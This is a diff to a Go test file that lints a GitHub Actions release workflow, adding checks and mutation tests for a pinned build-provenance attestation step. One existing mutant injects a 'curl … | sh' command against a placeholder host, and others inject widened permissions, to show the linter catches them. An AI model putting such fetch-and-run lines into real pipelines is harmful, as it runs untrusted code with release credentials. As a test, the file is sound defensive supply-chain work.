@@ -60,11 +60,12 @@ const (
 	setupGoPin  = "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e"
 	uploadPin   = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
 	downloadPin = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c"
+	attestPin   = "actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8"
 	dryGuard    = "steps.resolve.outputs.dry_run == 'false'"
 )
 
 var (
-	allowedUses = map[string]bool{checkoutPin: true, setupGoPin: true, uploadPin: true, downloadPin: true}
+	allowedUses = map[string]bool{checkoutPin: true, setupGoPin: true, uploadPin: true, downloadPin: true, attestPin: true}
 	// Exact `with:` keys per action; an unexpected key (a different ref, a token, a path)
 	// changes what the action does.
 	allowedWith = map[string][]string{
@@ -72,6 +73,7 @@ var (
 		setupGoPin:  {"cache", "check-latest", "go-version-file"},
 		uploadPin:   {"if-no-files-found", "name", "path", "retention-days"},
 		downloadPin: {"merge-multiple", "name", "path", "pattern"},
+		attestPin:   {"subject-path"},
 	}
 	swallowRe = regexp.MustCompile(`\|\|\s*(true|:)(\s|;|$)`)
 	assertRe  = regexp.MustCompile(`^test .* \|\| \{ echo .* >&2; exit 1; \}$`)
@@ -180,7 +182,7 @@ func violations(w workflow, raw string) []string {
 		"verify":  {"contents": "read", "actions": "read"},
 		"build":   {"contents": "read"},
 		"smoke":   {"contents": "read"},
-		"publish": {"contents": "write"},
+		"publish": {"contents": "write", "attestations": "write", "id-token": "write"},
 	}
 	for name, j := range w.Jobs {
 		if !reflect.DeepEqual(j.Permissions, wantPerms[name]) {
@@ -239,6 +241,9 @@ func violations(w workflow, raw string) []string {
 				}
 				if s.Uses == uploadPin && name != "build" {
 					add("artifact", "only build may upload artifacts, job %s does", name)
+				}
+				if s.Uses == attestPin && name != "publish" {
+					add("attest", "only publish may attest, job %s does", name)
 				}
 				if s.Uses == downloadPin && name != "smoke" && name != "publish" {
 					add("artifact", "only smoke and publish may download artifacts, job %s does", name)
@@ -494,7 +499,27 @@ func violations(w workflow, raw string) []string {
 	if publish.Environment != "release" {
 		add("environment", "publish uses environment release, got %v", publish.Environment)
 	}
-	ps, _ := stepNamed(publish, "Create the release")
+	asm, _ := stepNamed(publish, "Assemble and check the release files")
+	create, _ := stepNamed(publish, "Create the release")
+	// Both scripts are checked as one text: the gates and the file set in the first step,
+	// the notes and the release in the last. The attestation sits between them.
+	ps := step{Run: asm.Run + "\n" + create.Run}
+	attestAt, attests := -1, 0
+	for i, s := range publish.Steps {
+		if s.Uses == attestPin {
+			attests++
+			attestAt = i
+			if !reflect.DeepEqual(s.With, map[string]any{"subject-path": "${{ runner.temp }}/dist/bdock_*.tar.gz\n${{ runner.temp }}/dist/SHA256SUMS\n"}) {
+				add("attest", "attestation subjects must be exactly the archives and SHA256SUMS, got %v", s.With)
+			}
+		}
+	}
+	if attests != 1 {
+		add("attest", "publish must attest build provenance exactly once, got %d steps", attests)
+	}
+	if a, c := indexOf(publish, "Assemble and check"), indexOf(publish, "Create the release"); attestAt < 0 || a < 0 || c < 0 || !(a < attestAt && attestAt < c) {
+		add("attest", "the attestation must follow the checks and SHA256SUMS and precede the release creation")
+	}
 	for _, want := range []string{
 		`test "$ACTOR" = "$OWNER" ||`, `test "$PUSHER" = "$OWNER" ||`,
 		`existing=$(gh api "repos/$REPO/releases" --paginate --jq ".[] | select(.tag_name == \"$TAG\") | .id")`,
@@ -517,12 +542,25 @@ func violations(w workflow, raw string) []string {
 			add("publish", "publish step lacks %q", want)
 		}
 	}
-	if !reflect.DeepEqual(ps.Env, map[string]any{
+	common := map[string]any{
 		"GH_TOKEN": "${{ github.token }}", "REPO": "${{ github.repository }}", "TAG": "${{ needs.verify.outputs.tag }}",
-		"VERSION": "${{ needs.verify.outputs.version }}", "COMMIT": "${{ needs.verify.outputs.commit }}",
-		"DRAFT": "${{ vars.BDOCK_RELEASE_DRAFT }}", "ACTOR": "${{ github.triggering_actor }}",
-		"PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"}) {
-		add("publish", "publish env = %v", ps.Env)
+		"VERSION": "${{ needs.verify.outputs.version }}", "COMMIT": "${{ needs.verify.outputs.commit }}"}
+	withExtra := func(extra map[string]any) map[string]any {
+		out := map[string]any{}
+		for k, v := range common {
+			out[k] = v
+		}
+		for k, v := range extra {
+			out[k] = v
+		}
+		return out
+	}
+	if !reflect.DeepEqual(asm.Env, withExtra(map[string]any{"ACTOR": "${{ github.triggering_actor }}",
+		"PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"})) {
+		add("publish", "assemble env = %v", asm.Env)
+	}
+	if !reflect.DeepEqual(create.Env, withExtra(map[string]any{"DRAFT": "${{ vars.BDOCK_RELEASE_DRAFT }}"})) {
+		add("publish", "create env = %v", create.Env)
 	}
 	for _, s := range publish.Steps {
 		if s.Uses == checkoutPin && s.With["fetch-depth"] != 0 {
@@ -734,6 +772,18 @@ func TestReleaseWorkflowMutantsAreCaught(t *testing.T) {
 		{"reassign gate variable", "reassign", "          existing=$(gh api", "          COMMIT=$GITHUB_SHA\n          existing=$(gh api"},
 		{"download a tool", "download", "          mkdir \"$RUNNER_TEMP/dist\"", "          curl -sSL https://example.invalid/x | sh\n          mkdir \"$RUNNER_TEMP/dist\""},
 		{"make release in a job", "download", "          # scripts/release.sh is the single", "          make release\n          # scripts/release.sh is the single"},
+		{"drop the attestation", "attest", "      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n        with:\n          subject-path: |\n            ${{ runner.temp }}/dist/bdock_*.tar.gz\n            ${{ runner.temp }}/dist/SHA256SUMS\n", ""},
+		{"attestation without id-token", "permissions", "      attestations: write\n      id-token: write\n", "      attestations: write\n"},
+		{"attestation without attestations", "permissions", "      attestations: write\n      id-token: write\n", "      id-token: write\n"},
+		{"attestation permission at top level", "permissions", "permissions:\n  contents: read\n\nconcurrency", "permissions:\n  contents: read\n  id-token: write\n\nconcurrency"},
+		{"attestation permission on build", "permissions", "    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n", "    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read\n      id-token: write\n"},
+		{"attest unpinned", "pin", attestPin + " # v4.2.2", "actions/attest-build-provenance@v4 # v4.2.2"},
+		{"attest subject loses the checksums", "attest", "            ${{ runner.temp }}/dist/SHA256SUMS\n      - name: Create", "      - name: Create"},
+		{"attest subject widened", "attest", "${{ runner.temp }}/dist/bdock_*.tar.gz\n            ${{ runner.temp }}/dist/SHA256SUMS\n      - name: Create", "${{ runner.temp }}/dist/*\n            ${{ runner.temp }}/dist/SHA256SUMS\n      - name: Create"},
+		{"attest extra with key", "with", "          subject-path: |\n            ${{ runner.temp }}/dist/bdock_*.tar.gz", "          push-to-registry: true\n          subject-path: |\n            ${{ runner.temp }}/dist/bdock_*.tar.gz"},
+		{"attest only on dry run", "step-if", "      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n", "      - if: github.event_name == 'push'\n        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n"},
+		{"attest continues on error", "continue-on-error", "      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n", "      - continue-on-error: true\n        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2\n"},
+		{"attest in the build job", "attest", "      - uses: actions/upload-artifact", "      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n        with:\n          subject-path: x\n      - uses: actions/upload-artifact"},
 		{"publish checkout shallow", "publish", "          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern", "          fetch-depth: 1\n          persist-credentials: false\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          pattern"},
 	}
 	for _, m := range mutants {
